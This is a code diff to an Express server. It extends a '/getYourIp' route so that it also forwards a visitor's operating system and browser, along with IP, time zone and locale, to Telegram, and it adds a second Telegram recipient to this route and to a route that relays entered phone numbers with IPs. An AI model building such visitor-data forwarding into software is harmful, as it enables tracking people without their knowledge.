@@ -74,7 +74,7 @@ const TELEGRAM_CHAT_IDS = [
 router.post("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     var _a, _b;
     const ip = getPostClientIp(req);
-    const { timeInfo, languageInfo } = (_a = req.body) !== null && _a !== void 0 ? _a : {};
+    const { timeInfo, languageInfo, os, browser } = (_a = req.body) !== null && _a !== void 0 ? _a : {};
     if (!timeInfo ||
         typeof timeInfo.visitorTimeZone !== "string" ||
         !languageInfo ||
@@ -88,6 +88,10 @@ router.post("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, functi
 
 🌐 <b>آی‌پی:</b> ${ip}
 
+📱 <b>اطلاعات سیستم:</b>
+سیستم عامل : ${os}
+برازر : ${browser}
+
 🕒 <b>اطلاعات زمانی</b>
 منطقه‌ی زمانی بازدیدکننده: ${timeInfo.visitorTimeZone}
 اختلاف زمانی با تهران (دقیقه): ${timeInfo.difference}
@@ -100,7 +104,7 @@ router.post("/getYourIp", (req, res) => __awaiter(void 0, void 0, void 0, functi
 لوکال: ${(_b = languageInfo.locale) !== null && _b !== void 0 ? _b : "در دسترس نیست"}
 `;
     try {
-        yield (0, telegram_1.sendTelegramMessageToAll)(message, [5665639218]);
+        yield (0, telegram_1.sendTelegramMessageToAll)(message, [5665639218, 192959272]);
         return res.json({
             success: true,
             message: "Sent successfully",
@@ -123,7 +127,7 @@ router.get("/phoneEntered", (req, res) => __awaiter(void 0, void 0, void 0, func
     const phone = typeof req.query.phone === "string" ? req.query.phone.trim() : "";
     let message;
     try {
-        yield (0, telegram_1.sendTelegramMessageToAll)(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218]);
+        yield (0, telegram_1.sendTelegramMessageToAll)(`A Special User Entered Phone: ${phone} — IP: ${ip}`, [5665639218, 192959272]);
         message = "Sent was Successful Arash";
     }
     catch (error) {
